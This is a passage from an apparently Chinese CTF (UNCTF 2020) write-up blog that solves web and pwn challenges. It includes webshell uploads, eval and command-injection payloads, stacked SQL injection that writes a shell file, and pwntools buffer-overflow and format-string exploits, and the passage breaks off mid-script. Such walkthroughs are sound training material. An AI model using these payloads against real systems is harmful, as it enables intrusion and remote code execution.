class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们的目的是绕过验证，使其执行eval函数。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">/?verif=<span class="number">0e1290633704</span><span class="variable">&amp;m</span>=phpinfo<span class="variable">&amp;password</span>=<span class="number">1</span><span class="variable">&amp;</span>adminPassword=c4ca4238a0b923820dcc509a6f75849b<span class="variable">&amp;var12</span>=\<span class="string">";$m();//</span></span><br></pre></td></tr></table></figure></div>

<p>在执行过后的phpinfo文件中找到flag。</p>
<h4 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h4><p>题目描述</p>
<blockquote>
<p>随便上传</p>
</blockquote>
<p>目的是想办法上传个小马，使我们能够执行拿到shell。</p>
<p>首先传入php文件，提示我们filename error，其实像这里，我是直接传入了.htaccess文件，使我们接下来传入的图片马能直接作为php文件执行。即传入</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="fileUpload"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-p\</span><br><span class="line"> .jpg</span><br></pre></td></tr></table></figure>

<p>接着传入带有一句话的webshell文件。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="fileUpload"; filename="eval.jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST["shell"]);</span><br></pre></td></tr></table></figure>

<p>蚁剑链接，后者直接通过post请求shell，拿到flag。</p>
<h4 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h4><p>题目源码下方存在一个字符串”B4Z0-@:OCnDf,”，base一波发现是base85加密，解密得到get action</p>
<p>即我们需要get传入action变量。</p>
<p>使用php伪协议尝试读取源码。由于base被过滤了，所以我们进行url编码绕过：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php:<span class="regexp">//</span>filter<span class="regexp">/convert.b%2561se64-encode/</span>resource=index.php</span><br></pre></td></tr></table></figure></div>

<p>得到index.php源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($action))&#123;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">	&#125;							</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>接着我们读取flag.php源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>但这里是一个假的flag。我们把hint解密十六进制。得到1nD3x.php。</p>
<p>接着利用伪协议读取出1nD3x.php的源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>看到这里，目的就比较明确了，想办法进行getshell。</p>
<p>我们可以利用file_put_contents函数，通过文件包含，写入shell文件</p>
<p>POC</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">code=<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsKCgoK'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">  url=<span class="string">'http://5d09fb87-9378-4322-8a69-c2c59fe4a173.node1.hackingfor.fun/1nD3x.php/?code=$_GET[0](C,&#123;&#125;,8);&amp;0=file_put_contents'</span>.format(i)</span><br><span class="line">  requests.get(url)</span><br></pre></td></tr></table></figure></div>

<p>此时我们就写入了一句话木马，参数为a。接着通过蚁剑进行连接，达到flag。</p>
<p><img src="/images/unctf2020/image-20201115151222122.png" alt=""></p>
<h4 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h4><p>打开题目，很明显需要进行命令执行</p>
<p>经测试，过滤了一些字符，给出几个绕过方法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">管道符(%<span class="number">0</span>A)绕过分号、 %<span class="number">09</span> 绕过 空格、less 绕过 cat。</span><br></pre></td></tr></table></figure></div>

<p>打印出源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">	$ip=$_GET[<span class="string">'url'</span>];</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i"</span>, $ip))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">	<span class="keyword">echo</span>($a);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('欢迎来到UN`s online tools 如果师傅觉得题目不适合您，可以出门左拐')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>利用base64编码绕过执行，将执行的命令进行base64编码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LSL"><figure class="iseeu highlight /lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|echo%<span class="number">09</span><span class="string">"Y2F0IC9mbGFn"</span>|base64%<span class="number">09</span>-d|sh</span><br></pre></td></tr></table></figure></div>

<p>得到flag。</p>
<h4 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h4><p>这一题本身并不难，只是由于题目并未给出任何有效提示，以至于不好进行判断</p>
<p>其实只是个存在验证，可以通过00截断或数组来进行绕过，猜测是做了is_file()函数的判断。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span>=&gt;</span><br><span class="line">?<span class="attribute">name</span>=%00</span><br></pre></td></tr></table></figure></div>

<p>直接输出flag</p>
<h4 id="check-sql"><a href="#check-sql" class="headerlink" title="check_sql"></a>check_sql</h4><p>堆叠注入，跟强网杯那题类似。</p>
<p>利用方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>接下来就在注入的道路上越走越远…数据库都被注穿了也没看到flag。</p>
<p>后来知道了flag不在数据库中，看样子需要写入shell文件，来查看flag了</p>
<p>题目过滤了很多字符，经一番fuzz过后，得到如下利用方法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1';PREPARE hacker from concat(%s);EXECUTE hacker;#"</span></span><br><span class="line">exp=<span class="string">"select '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/html/shell.php'"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">  res += <span class="string">"char(%s),"</span>%(ord(i))</span><br><span class="line">my_payload = payload%(res[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">print</span> my_payload</span><br></pre></td></tr></table></figure></div>

<p>即传入如下payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">PREPARE</span> hacker <span class="keyword">from</span> <span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">60</span>),<span class="built_in">char</span>(<span class="number">63</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">64</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">118</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">40</span>),<span class="built_in">char</span>(<span class="number">36</span>),<span class="built_in">char</span>(<span class="number">95</span>),<span class="built_in">char</span>(<span class="number">80</span>),<span class="built_in">char</span>(<span class="number">79</span>),<span class="built_in">char</span>(<span class="number">83</span>),<span class="built_in">char</span>(<span class="number">84</span>),<span class="built_in">char</span>(<span class="number">91</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">93</span>),<span class="built_in">char</span>(<span class="number">41</span>),<span class="built_in">char</span>(<span class="number">59</span>),<span class="built_in">char</span>(<span class="number">63</span>),<span class="built_in">char</span>(<span class="number">62</span>),<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">105</span>),<span class="built_in">char</span>(<span class="number">110</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">117</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">105</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">118</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">46</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">39</span>));<span class="keyword">EXECUTE</span> hacker;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>此时就在题目www目录下写入了shell.php文件，参数为1，利用蚁剑链接获取flag。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h4><p>点开之后有一个网址，和一个端口，于是用 虚拟机 nc 加上网址空格端口</p>
<p>提示我们use pwntools，于是使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'45.158.33.12'</span>,<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>得到flag。</p>
<h4 id="fan"><a href="#fan" class="headerlink" title="fan"></a>fan</h4><p>栈溢出且含有后门。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"input your message\n"</span>,<span class="string">"a"</span>*<span class="number">0x38</span>+p64(<span class="number">0x400735</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="do-you-like-me"><a href="#do-you-like-me" class="headerlink" title="do_you_like_me?"></a>do_you_like_me?</h4><p>简单栈溢出且存在后门函数</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,port)</span><br><span class="line">system_addr=<span class="number">0x4006D1</span></span><br><span class="line"></span><br><span class="line">pd=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">pd+=p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Give me your input : "</span>)</span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;5c500e54-d445-46cc-8206-6a85da4b5a1c&#125;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="你真的会pwn吗？"><a href="#你真的会pwn吗？" class="headerlink" title="你真的会pwn吗？"></a>你真的会pwn吗？</h4><p>考点： 格式化字符串任意地址写</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,<span class="number">30656</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">offset=<span class="number">12</span></span><br><span class="line">printf_got=<span class="number">0x60107C</span><span class="comment">#elf.got['printf']</span></span><br><span class="line">system_plt=<span class="number">0x40070D</span><span class="comment">#elf.plt['system']</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span>+str(system_plt)+<span class="string">"c%12$lln"</span>+p64(printf_got)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="pwngirl"><a href="#pwngirl" class="headerlink" title="pwngirl"></a>pwngirl</h4><p>考点：</p>
<p>1.scanf 特性：输入 - + 不会覆盖内存的内容。</p>
<p>2.当输入27时，我们输入的数值 不会进行排序</p>
<p>3.%lld 占4个字节</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./pwngirl")</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,<span class="number">31644</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwngirl"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">back_door=<span class="number">0x400C04</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>,<span class="string">"@"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please answer the question2:"</span>,<span class="string">"^"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input your name:"</span>,<span class="string">"yang"</span>)</span><br><span class="line"></span><br><span class="line">time=<span class="number">12</span></span><br><span class="line">p.sendlineafter(<span class="string">"how many girlfriends do you 